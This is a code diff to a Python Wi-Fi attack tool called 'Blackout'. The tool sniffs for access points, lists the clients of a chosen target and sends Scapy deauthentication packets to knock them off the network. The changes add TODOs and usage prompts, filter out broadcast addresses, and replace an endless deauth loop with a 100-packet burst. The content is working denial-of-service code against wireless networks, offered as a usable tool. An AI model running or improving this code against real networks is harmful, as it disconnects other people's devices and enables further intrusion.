@@ -1,10 +1,15 @@
 #!/usr/bin/python3
 
-#  TODO Use closure the fix the signal_handler issue
-#  TODO: look for a way to use threads instead of Processes (threads were harder to stop with Ctrl-C?)
-#  TODO: Improve -- Ending the AP sniffing phase. It's too rough.
+#  TODO: Use closure the fix the signal_handler issue
+#  TODO: Use threads instead of Processes (threads were harder to stop with Ctrl-C?)
+#  TODO: Improve -- Ending the AP sniffing phase. It's too rough. Ctrl-C is the current method.
+#  TODO: Explore the use or curses library for the UI.
 #  TODO: Can all the processes be daemonised?
-#  TODO: Fix up argparse
+#  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
+#  TODO: Use argparse for command-line options
+#       TODO: Allow option for number of deauth packets to send (EX: -c 100)
+#       TODO: Allow option for providing interface name
+#       TODO:
 
 import os
 import re
@@ -85,7 +90,7 @@ class Blackout:
             self.proc_sniff_ap.start()
 
             print(f"{Colour.BOLD}Sniffing for Access Points on all channels...{Colour.ENDC}\n")
-            
+            print(f"{Colour.OKBLUE}Press Ctrl-c to select target{Colour.ENDC}")
 
             # Wait for processes to terminate
             self.proc_channel_hop.join()
@@ -114,7 +119,8 @@ class Blackout:
             elif choice == '2':
                 horizontal_rule(30)
                 print(f"{Colour.BOLD}Sniffing for clients of AP - {self.target_ap['bssid']}...\n{Colour.ENDC}")
-                
+                print(f"{Colour.OKBLUE}Press Ctrl-c to select target{Colour.ENDC}")
+
                 self.proc_sniff_clients.start()
                 self.proc_sniff_clients.join()
 
@@ -171,8 +177,8 @@ class Blackout:
             # instead use the count argument to set number of packets. However,
             # I found this to be more reliable.
             try:
-                while True:
-                    sendp(deauth_pkt, iface=conf.iface)
+                #while True:
+                sendp(deauth_pkt, inter=0.1, count=100, iface=conf.iface)
 
             except KeyboardInterrupt:
                 print("[*] Keyboard Interrupt\n")
@@ -218,13 +224,14 @@ class Blackout:
                     src = pkt.addr2.upper()
 
                     # If the target AP is either source or destination, we know the other is a client
-                    if src == self.target_bssid and dst not in self.ap_clients:
-                        self.ap_clients.append(dst)
-                        print(f"[*] {dst}\t{self.get_vendor(dst)}")
+                    if BROADCAST_ADDR not in (dst, src):
+                        if src == self.target_bssid and dst not in self.ap_clients:
+                            self.ap_clients.append(dst)
+                            print(f"[*] {dst}\t{self.get_vendor(dst)}")
 
-                    elif dst == self.target_bssid and src not in self.ap_clients:
-                        self.ap_clients.append(src)
-                        print(f"[*] {src}\t{self.get_vendor(src)}")
+                        elif dst == self.target_bssid and src not in self.ap_clients:
+                            self.ap_clients.append(src)
+                            print(f"[*] {src}\t{self.get_vendor(src)}")
 
         except Exception as e:
             print(f"[*] sniff_clients error: {e}")
